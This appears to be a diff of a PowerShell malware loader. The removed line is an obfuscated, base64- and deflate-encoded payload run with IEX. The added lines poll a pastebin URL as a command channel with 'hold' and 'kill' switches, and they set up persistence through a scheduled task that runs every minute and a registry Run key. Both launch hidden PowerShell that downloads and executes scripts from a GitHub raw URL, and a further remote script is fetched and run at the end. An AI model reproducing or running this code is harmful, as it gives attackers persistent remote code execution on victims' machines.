@@ -1,1 +1,23 @@
-(NEW-OBjecT  io.coMprESSIon.DeFLATEsTream([io.MeMorysTreAM][ConVert]::fRoMbase64sTRing( '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') , [sySTEM.Io.cOmpReSSion.comprEsSionMODE]::DECoMPREsS) |ForEAch{NEW-OBjecT  iO.stREAmrEAdeR($_ , [sYsteM.TexT.eNcodinG]::AscII )}).rEADToeNd( )| iEX
+$oHTTP = New-Object -ComObject MSXML2.XMLHTTP
+$oHTTP.open('GET', 'https://pastebin.com/raw/Wy2fMXaw', $false)
+$oHTTP.send()
+
+if ($oHTTP.status -eq 200) {
+    $tunnel = $oHTTP.responseText
+}
+
+if ($tunnel -match 'hold') {
+    Exit
+}
+
+if ($tunnel -match 'kill') {
+    schtasks /Delete /TN "Start" /f
+    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /f
+    Exit
+}
+
+schtasks /Create /TN "Start" /SC MINUTE /MO 1 /TR "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo1.ps1 -UseBasicParsing)""" /F
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /t REG_SZ /d "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo1.ps1 -UseBasicParsing)\""" /F
+
+$re = (IWR "https://pastebin.com/raw/Wy2fMXaw"); IEX "IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo.ps1 -UseBasicParsing); repo $re"
